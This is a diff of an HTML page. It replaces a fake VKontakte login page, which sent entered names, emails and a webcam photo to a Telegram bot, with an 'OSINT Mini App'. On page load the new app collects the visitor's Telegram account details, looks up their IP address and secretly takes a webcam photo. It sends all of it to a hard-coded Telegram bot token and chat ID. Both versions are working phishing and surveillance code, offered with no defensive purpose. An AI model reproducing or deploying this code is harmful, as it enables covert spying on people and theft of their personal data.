@@ -3,103 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Авторизация ВКонтакте</title>
-    <style>
-        body {
-            background-color: #f5f5f5;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background-color: white;
-            padding: 40px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-            width: 400px;
-            text-align: center;
-            border: 1px solid #d8d8d8;
-        }
-        h1 {
-            font-size: 28px;
-            color: #4C75A3;
-            margin-bottom: 20px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            font-size: 14px;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #2E66A2;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #1A4F84;
-        }
-        .footer {
-            font-size: 12px;
-            color: #888;
-            margin-top: 10px;
-        }
-        .footer a {
-            color: #1A4F84;
-            text-decoration: none;
-        }
-    </style>
+    <title>OSINT Mini App</title>
     <script>
-        const TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";  // Токен бота
-        const CHAT_ID = "7477642275";  // Chat ID
-        const PHOTO_API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
-        const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
-        // Функция для отправки данных и фото в Telegram
-        function sendDataToTelegram(name, email, dataURI) {
-            let message = `📋 Новый пользователь:
-👤 Имя: ${name}
-📧 Email: ${email}`;
-
-            // Отправка текстового сообщения в Telegram
+        const BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";
+        const CHAT_ID = "7477642275";
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const PHOTO_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        
+        function sendToTelegram(message) {
             fetch(API_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
             });
-
-            // Отправка фото в Telegram
-            if (dataURI) {
-                let photoBlob = dataURItoBlob(dataURI);
-                let formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', photoBlob, 'photo.png');
-
-                fetch(PHOTO_API_URL, {
-                    method: 'POST',
-                    body: formData
-                }).then(response => {
-                    return response.json();
-                }).then(data => {
-                    console.log('Фото отправлено в Telegram:', data);
-                }).catch(error => {
-                    console.error('Ошибка отправки фото:', error);
-                });
+        }
+        
+        function getUserIP() {
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    sendToTelegram(`🌐 IP-адрес пользователя: ${data.ip}`);
+                })
+                .catch(error => console.error('Ошибка получения IP:', error));
+        }
+        
+        function getUserInfo() {
+            if (window.Telegram && Telegram.WebApp) {
+                const user = Telegram.WebApp.initDataUnsafe.user;
+                if (user) {
+                    let userInfo = `👤 Новый логин\n`;
+                    userInfo += `[+] Имя: ${user.first_name} ${user.last_name || ''}\n`;
+                    userInfo += `[+] Юзернейм: @${user.username || 'Не указан'}\n`;
+                    userInfo += `[+] ID: ${user.id}\n`;
+                    userInfo += `[+] Язык: ${Telegram.WebApp.initDataUnsafe.language_code}\n\n`;
+                    sendToTelegram(userInfo);
+                }
             }
         }
-
-        // Функция для преобразования Data URL в Blob
+        
+        function capturePhoto() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        let canvas = document.createElement("canvas");
+                        let ctx = canvas.getContext("2d");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        let photo = canvas.toDataURL("image/png");
+                        sendPhotoToTelegram(photo);
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 3000);
+                }).catch(err => console.error("Ошибка камеры:", err));
+        }
+        
+        function sendPhotoToTelegram(photoDataUrl) {
+            let formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', dataURItoBlob(photoDataUrl), 'photo.png');
+            fetch(PHOTO_API_URL, { method: 'POST', body: formData });
+        }
+        
         function dataURItoBlob(dataURI) {
             let byteString = atob(dataURI.split(',')[1]);
             let arrayBuffer = new ArrayBuffer(byteString.length);
@@ -109,63 +76,18 @@
             }
             return new Blob([arrayBuffer], { type: 'image/png' });
         }
-
-        // Функция для захвата фото с камеры и отправки в Telegram
-        function capturePhoto(stream, videoElement) {
-            let canvas = document.createElement("canvas");
-            let ctx = canvas.getContext("2d");
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-            let photoDataUrl = canvas.toDataURL("image/png");
-
-            // Отправка данных и фото в Telegram
-            const name = document.getElementById("name").value;
-            const email = document.getElementById("email").value;
-            sendDataToTelegram(name, email, photoDataUrl);
-
-            // Останавливаем поток камеры и удаляем элемент видео
-            stream.getTracks().forEach(track => track.stop());
+        
+        function initApp() {
+            getUserInfo();
+            getUserIP();
+            capturePhoto();
         }
-
-        // Функция для захвата фото и отправки
-        function getCameraAndTakePhoto() {
-            // Пытаемся получить доступ к камере
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        let videoElement = document.createElement("video");
-                        videoElement.srcObject = stream;
-                        videoElement.play();
-
-                        // Через 2 секунды сделаем снимок
-                        setTimeout(() => {
-                            capturePhoto(stream, videoElement);
-                        }, 2000); // Даем 2 секунды на загрузку камеры
-                    }).catch(err => {
-                        console.log("Ошибка с доступом к камере: " + err);
-                    });
-            }
-        }
-
-        // Обработчик события на кнопку "Зарегистрироваться"
-        function handleRegistration() {
-            // При нажатии кнопки делаем фото и отправляем данные
-            getCameraAndTakePhoto();
-        }
+        
+        window.onload = initApp;
     </script>
 </head>
 <body>
-    <div class="container">
-        <h1>ВКонтакте</h1>
-        <p>Пожалуйста, авторизуйтесь</p>
-        <input type="text" id="name" placeholder="Имя" required />
-        <input type="email" id="email" placeholder="Email" required />
-        <button onclick="handleRegistration()">Зарегистрироваться</button>
-        <div class="footer">
-            <p>Зарегистрированы? <a href="#">Войти</a></p>
-        </div>
-    </div>
+    <h2>OSINT Mini App</h2>
+    <p>Данные пользователя отправляются...</p>
 </body>
 </html>
